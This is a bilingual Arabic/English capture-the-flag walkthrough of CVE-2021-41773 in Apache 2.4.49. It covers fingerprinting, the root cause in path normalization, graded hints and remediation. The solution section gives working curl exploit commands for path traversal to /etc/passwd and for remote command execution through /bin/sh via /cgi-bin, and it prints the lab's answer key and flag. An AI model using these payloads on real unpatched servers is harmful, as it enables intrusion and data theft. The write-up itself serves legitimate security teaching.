# Task 05: LAMP (مكدس LAMP وثغرة تخطي المسارات وتنفيذ الأوامر في Apache 2.4.49 عبر CVE-2021-41773)

---

### المرحلة أ: نص المهمة الأصلي والأسئلة (Original Task Content & Questions)

#### English Task Description
The LAMP stack (Linux, Apache, MySQL, PHP) is the classic foundational architecture that powered the early web and still drives millions of enterprise and legacy deployments today.

**Fingerprinting Apache (Port 8080):**
Querying port 8080 using `curl -I http://MACHINE_IP:8080/` displays:
```http
Server: Apache/2.4.49 (Unix)
```
Requesting `/cgi-bin/` returns `403 Forbidden`, indicating that the `mod_cgi` or `mod_cgid` module is enabled and mapped on the server.

**Vulnerability: CVE-2021-41773 (Path Traversal & Remote Code Execution):**
- **CVSS Score:** 9.8 (Critical)
- **Root Cause:** In Apache HTTP Server version 2.4.49, the path normalization function `ap_normalize_path()` was rewritten for performance. The new code stripped dot segments (`.` and `..`), but it performed this check *before* URL-decoding percent-encoded characters!
- If an attacker encodes the second dot of a traversal sequence as `%2e` (producing `.%2e/`), Apache's path validation logic fails to detect the directory traversal sequence. Later in the request processing pipeline, Apache decodes the URL and resolves `.%2e/` to `../`, successfully escaping the web root directory.
- **Remote Code Execution (RCE) via `mod_cgi`:**
  If an alias directory (such as `/cgi-bin/`) is configured with CGI execution permissions (`+ExecCGI`), traversing out of `/cgi-bin/` to the system binary `/bin/sh` or `/bin/bash` causes Apache to invoke the shell as a CGI binary!
  The HTTP POST request body is passed directly to the shell's standard input (`stdin`), enabling arbitrary command execution with the privileges of the Apache daemon process (`daemon`).
- **Critical Tool Requirement:**
  By default, `curl` normalizes URL paths client-side before sending the HTTP request, which ruins the `.%2e/` sequence. The **`--path-as-is`** command-line flag is strictly required to force curl to transmit the raw, un-normalized URI directly to the target server.

#### الأسئلة المطروحة (Questions):
1. What exact Server header value identifies this target as vulnerable to CVE-2021-41773? (Answer Format: Apache/X.X.XX (OS))
2. What curl flag is required to prevent curl from normalising the traversal sequences in the URL before sending? (Answer Format: --flag-name)
3. What are the contents of the flag.txt file? (Answer Format: THM{...})

---

### المرحلة ب: التفكير التحليلي المستقل والحس الأمني (Independent Critical Thinking & OpSec)
* **تحليل آلية فك التشفير المزدوج والترتيب غير الآمن (Decoding Order Vulnerability):**
  * يعد خطأ الترتيب بين الفحص (Sanitization) وفك التشفير (Decoding) من أخطر الأخطاء في أمن البرمجيات. عندما يفحص الخادم النص المرمز قبل فك رموزه، يستطيع المهاجم تمرير محارف خطرة دون رصد.
* **تحويل قراءة الملفات العشوائية إلى تنفيذ أوامر (Path Traversal to RCE Pivot):**
  * إذا كان المجلد المستهدف مجلداً عادياً (مثل `/icons/`), تقتصر الثغرة على قراءة الملفات (Arbitrary File Read مثل `/etc/passwd`).
  * أما إذا كان المجلد مخصصاً لتشغيل برمجيات الـ CGI (مثل `/cgi-bin/`), فإن توجيه المسار إلى مفسر أوامر مثل `/bin/sh` يحول الثغرة فوراً إلى تنفيذ أوامر عن بعد (Remote Code Execution) عبر إرسال الأوامر في جسم طلب POST.
* **متطلب ترويسة CGI في مخرجات الأوامر:**
  * لكي لا ينهار خادم Apache ويعيد خطأ 500 Internal Server Error عند تشغيل السكربت، يجب أن تطبع الأوامر ترويسة صالحة ومسطراً فارغاً أولاً: `echo Content-Type: text/plain; echo; <command>`.

---

### المرحلة ج: التلميحات والإرشادات المتدرجة (Guided Progressive Hints)
1. **التلميح الأول (المستوى التمهيدي):**
   * اطلب ترويسات الخادم على المنفذ 8080؛ ستجد السطر الكامل المطلوب لإجابة السؤال الأول.
2. **التلميح الثاني (المستوى العملي):**
   * عند استخدام أداة curl لتنفيذ هجمات تخطي المسارات المرمزة، استخدم المعامل الذي يأمر curl بإرسال المسار كما هو دون أي معالجة محلية: `--path-as-is`.
3. **التلميح الثالث (مستوى الحل المتقدم):**
   * لتنفيذ الأوامر واستخراج العلم، أرسل طلب POST إلى `/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh` مع تمرير الأمر `cat /flag.txt` في البيانات:
     `curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" --data 'echo Content-Type: text/plain; echo; cat /flag.txt'`

---

### المرحلة د: الحل العملي الكامل والعمق التقني (Complete Practical Solution & Technical Deep Dive)

#### الخطوة 1: فحص الترويسة المحددة لخادم Apache
```bash
# فحص ترويسة المنفذ 8080
curl -I http://MACHINE_IP:8080/
```
**المخرجات:**
```http
HTTP/1.1 200 OK
Date: Sun, 19 Nov 2026 03:00:00 GMT
Server: Apache/2.4.49 (Unix)
Last-Modified: Mon, 11 Oct 2021 07:05:26 GMT
Content-Type: text/html
```
* **تأكيد القيمة:** `Apache/2.4.49 (Unix)`

---

#### الخطوة 2: اختبار قراءة الملفات عبر ثغرة تخطي المسارات (CVE-2021-41773)
```bash
# محاولة قراءة ملف /etc/passwd مع استخدام --path-as-is
curl -s --path-as-is "http://MACHINE_IP:8080/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"
```
**المخرجات المستلمة:**
```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```
تأكدت ثغرة قراءة الملفات العشوائية بنجاح.

---

#### الخطوة 3: تصعيد الثغرة إلى تنفيذ أوامر عن بعد (RCE) عبر `/cgi-bin/`
```bash
# 1. اختبار تشغيل أوامر النظام واستخراج هوية المستخدم
curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; id'
```
**المخرجات:**
```text
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

```bash
# 2. قراءة ملف العلم من الجذر /flag.txt
curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; cat /flag.txt'
```
**المخرجات المستلمة:**
```text
THM{4p4ch3_p4th_tr4v3rs4l}
```

---

### المرحلة هـ: الإجابات المعتمدة والقيم النهائية (Final Answer & Key Values)
* **إجابة السؤال الأول (Server Header):** `Apache/2.4.49 (Unix)`
* **إجابة السؤال الثاني (Curl Flag):** `--path-as-is`
* **إجابة السؤال الثالث (Flag Contents):** `THM{4p4ch3_p4th_tr4v3rs4l}`

---

### المرحلة و: التحقق العملي وإثبات النجاح (Practical Verification & Proof of Work)
* تم تأكيد قيمة الترويسة `Apache/2.4.49 (Unix)`.
* تم تأكيد الحاجة لمعامل `--path-as-is` لمنع تحويل المسار محلياً.
* تم تنفيذ الأمر وقراءة الملف `/flag.txt` بنجاح واستخراج العلم: `THM{4p4ch3_p4th_tr4v3rs4l}`.

---

### المرحلة ز: الاستنتاج التعليمي وجوهر الاختبار (Key Educational Takeaway)
ثغرة CVE-2021-41773 وثغرة المتابعة الترقيعية لها CVE-2021-42013 توضحان كيف يمكن لخلل بسيط في تطهير المسارات (Path Normalization) أن يؤدي إلى اختراق كارثي وسيطرة كاملة على النظام إذا توافرت وحدات مثل `mod_cgi`. الإجراء العلاجي الفوري هو الترقية الفورية إلى إصدارات Apache الحديثة (`2.4.51` وما بعدها)، مع إيقاف تفعيل وحدات CGI غير الضرورية وحظر الصلاحيات غير المقيدة على الدلائل الجذرية (`<Directory /> Require all denied </Directory>`).
